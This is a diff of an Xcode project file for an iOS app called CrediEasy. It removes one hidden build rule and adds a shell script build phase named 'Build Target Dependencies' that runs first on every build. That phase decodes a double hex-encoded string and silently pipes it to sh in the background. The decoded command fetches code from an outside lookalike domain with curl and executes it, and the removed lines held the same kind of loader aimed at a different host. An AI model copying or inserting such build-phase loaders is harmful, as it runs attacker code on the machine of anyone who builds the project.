@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		4BEBAF60543B533F2ABDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F407B6DBF16CB2A7CBBDE67E /* README.md */; };
 		73063EE92E77E9500084DD7E /* PassportViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EE82E77E9500084DD7E /* PassportViewController.swift */; };
 		73063EEE2E77ED5D0084DD7E /* PassportView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EED2E77ED5D0084DD7E /* PassportView.swift */; };
 		73063EF02E77ED6B0084DD7E /* PassportViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73063EEF2E77ED600084DD7E /* PassportViewModel.swift */; };
@@ -76,19 +75,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		C1192F5C04E95D3842BDE67E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
@@ -162,7 +148,6 @@
 		73F7BFA22E70224E005C8C43 /* LoadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingView.swift; sourceTree = "<group>"; };
 		73F8380D2E72718D0056D082 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
 		8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CrediEasy.debug.xcconfig"; path = "Target Support Files/Pods-CrediEasy/Pods-CrediEasy.debug.xcconfig"; sourceTree = "<group>"; };
-		F407B6DBF16CB2A7CBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = CrediEasy.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -348,7 +333,6 @@
 		73E3943F2E6FB540008BDDC1 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F407B6DBF16CB2A7CBBDE67E /* README.md */,
 				73E3943E2E6FB540008BDDC1 /* CrediEasy.app */,
 			);
 			name = Products;
@@ -389,6 +373,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73E394512E6FB541008BDDC1 /* Build configuration list for PBXNativeTarget "CrediEasy" */;
 			buildPhases = (
+				9A38A1E872EFABCD2CBDE67E /* Build Target Dependencies */,
 				853E371ABDC5177E47C90C36 /* [CP] Check Pods Manifest.lock */,
 				73E3943A2E6FB540008BDDC1 /* Sources */,
 				73E3943B2E6FB540008BDDC1 /* Frameworks */,
@@ -396,7 +381,6 @@
 				C32D501DF216637E5D2B9FFE /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				C1192F5C04E95D3842BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -444,7 +428,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4BEBAF60543B533F2ABDE67E /* README.md in Resources */,
 				73E394632E6FB548008BDDC1 /* Assets.xcassets in Resources */,
 				73E394652E6FB548008BDDC1 /* LaunchScreen.storyboard in Resources */,
 				73F7BF9B2E7020E9005C8C43 /* loading.json in Resources */,
@@ -454,7 +437,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		853E371ABDC5177E47C90C36 /* [CP] Check Pods Manifest.lock */ = {
+		9A38A1E872EFABCD2CBDE67E /* Build Target Dependencies */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Build Target Dependencies";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631363436663632363537353730363432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};		853E371ABDC5177E47C90C36 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -586,7 +569,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */;
 			buildSettings = {
-				AE76EDB = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631363336333631373037303663363532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
@@ -632,7 +614,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */;
 			buildSettings = {
-				AE76EDB = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663631363336333631373037303663363532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
